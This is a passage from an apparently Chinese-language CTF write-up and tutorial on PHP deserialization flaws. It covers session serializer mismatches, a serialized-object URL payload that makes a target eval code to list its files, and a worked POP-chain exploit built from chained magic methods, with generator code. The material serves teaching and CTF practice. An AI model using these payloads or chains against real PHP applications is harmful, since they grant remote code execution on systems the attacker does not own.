    {
        $m = new OowoO();
    }
    else
    {
        highlight_string(file_get_contents('sessiontest.php'));
    }
    ?>
先来看一看phpinfo里的内容 php版本：5.6.21  
**php大于5.5.4的版本中默认使用php_serialize规则**  
默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。  
> PHP手册  
>  Session 上传进度  
>  当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。
> 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态  
>
> 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在\$_SESSION中获得。
> 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与
> session.upload_progress.name连接在一起的值。
了解了之后，就可以通过POST方法来构造数据传入`$_SESSION`  
构造POST提交表单
构造序列化字符串
    info = 'phpinfo();';
        }
        function __destruct()
        {
            eval($this->info);
        }
    }
    if(isset($_GET['aa']))
    {
        if(unserialize($_GET['aa'])=='phpinfo')
        {
            $m = new Anti();
        }
    }
    else
    {
        header("location:index.html");
    }
    ?>
emmmm 几乎一样 可以自己试着做一下  
`http://54.200.169.99:7000/session.php?aa=O:4:"Anti":1:{s:4:"info";s:36:"print_r(scandir(dirname(__FILE__)));";}`  
发现flag文件  
D0g3{Sim_Pl3_S3sSi0n}
## 0x04 POP链构造
### POP：面向属性编程
面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented
Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。
### 基本概念
在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP
链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。  
二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提： **进行反序列化的数据能够被用户输入所控制。**
### POP链利用
一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。
### 实战训练
    mod1->test1();
            }
    }
    class Call
    {
            public $mod1;
            public $mod2;
            public function test1()
        {
                $this->mod1->test2();
        }
    }
    class funct
    {
            public $mod1;
            public $mod2;
            public function __call($test2,$arr)
            {
                    $s1 = $this->mod1;
                    $s1();
            }
    }
    class func
    {
            public $mod1;
            public $mod2;
            public function __invoke()
            {
                    $this->mod2 = "字符串拼接".$this->mod1;
            } 
    }
    class string1
    {
            public $str1;
            public $str2;
            public function __toString()
            {
                    $this->str1->get_flag();
                    return "1";
            }
    }
    class GetFlag
    {
            public function get_flag()
            {
                    echo "flag:"."xxxxxxxxxxxx";
            }
    }
    $a = $_GET['string'];
    unserialize($a);
    ?>
可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。
  1. `string1`中的`__tostring`存在`$this->str1->get_flag()`，分析一下要自动调用`__tostring()`需要把类`string1`当成字符串来使用，因为调用的是参数`str1`的方法，所以需要把`str1`赋值为类`GetFlag`的对象。
  2. 发现类`func`中存在`__invoke`方法执行了字符串拼接，需要把`func`当成函数使用自动调用`__invoke`然后把`$mod1`赋值为`string1`的对象与`$mod2`拼接。
  3. 在`funct`中找到了函数调用，需要把`mod1`赋值为`func`类的对象，又因为函数调用在`__call`方法中，且参数为`$test2`,即无法调用`test2`方法时自动调用 `__call`方法；
  4. 在`Call`中的`test1`方法中存在`$this->mod1->test2();`，需要把`$mod1`赋值为`funct`的对象，让`__call`自动调用。
  5. 查找`test1`方法的调用点，在`start_gg`中发现`$this->mod1->test1();`，把`$mod1`赋值为`start_gg`类的对象，等待`__destruct()`自动调用。
payload：
    mod1 = new Call();//把$mod1赋值为Call类对象
            }
            public function __destruct()
            {
                    $this->mod1->test1();
            }
    }
    class Call
    {
            public $mod1;
            public $mod2;
            public function __construct()
            {
                    $this->mod1 = new funct();//把 $mod1赋值为funct类对象
            }
            public function test1()
            {
                    $this->mod1->test2();
            }
    }
    class funct
    {
            public $mod1;
            public $mod2;
            public function __construct()
            {
                    $this->mod1= new func();//把 $mod1赋值为func类对象
            }
            public function __call($test2,$arr)
            {
                    $s1 = $this->mod1;
                    $s1();
            }
    }
    class func
    {
            public $mod1;
            public $mod2;
            public function __construct()
            {
                    $this->mod1= new string1();//把 $mod1赋值为string1类对象
            }
            public function __invoke()
            {        
                    $this->mod2 = "字符串拼接".$this->mod1;
            } 
    }
    class string1
    {
            public $str1;
            public function __construct()
            {
                    $this->str1= new GetFlag();//把 $str1赋值为GetFlag类对象          
            }
            public function __toString()
            {        
                    $this->str1->get_flag();
                    return "1";
            }
    }
    class GetFlag
    {
            public function get_flag()
            {
                    echo "flag:"."xxxxxxxxxxxx";
            }
    }
    $b = new start_gg;//构造start_gg类对象$b
    echo urlencode(serialize($b))."";//显示输出url编码后的序列化对象
输出payload后传参，成功执行get_flag()  
另外推荐一下柠檬师傅博客的那道题
>   
>  
## 0x05 小结
反序列化漏洞一般都是在白盒审计时发现并利用，需要构造PHP序列化代码，利用条件比较苛刻。
总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。
另外再贴一些相关文章，希望对大家有所帮助
>   
>    
>  